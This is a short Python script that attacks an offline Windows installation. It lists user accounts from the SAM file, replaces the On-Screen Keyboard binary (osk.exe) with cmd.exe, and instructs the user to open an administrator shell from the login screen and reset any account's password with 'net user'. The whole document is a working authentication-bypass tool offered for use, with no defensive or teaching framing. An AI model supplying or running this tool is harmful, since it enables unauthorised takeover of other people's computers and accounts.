import os

win=input("Enter Windows Directory\n-> ")

sam=win+"/Windows/System32/config/SAM"
cmd=win+"/Windows/System32/cmd.exe"
OSK=win+"/Windows/System32/osk.exe"

print("Found following users:\n")
os.system("sudo sampasswd -l {}".format(sam))
print("\n")

os.system("sudo cp {} {}.win".format(OSK, OSK))
os.system("sudo cp {} {}".format(cmd,OSK))

print("DONE!!!\nGo to the Windows login screen and run the ON SCREEN KEYBOARD, you'll have a terminal with administrator permissions.\n\nRun the following commands to change the password:\nnet user {WINDOWS_USERNAME} {NEW_PASSWORD}")
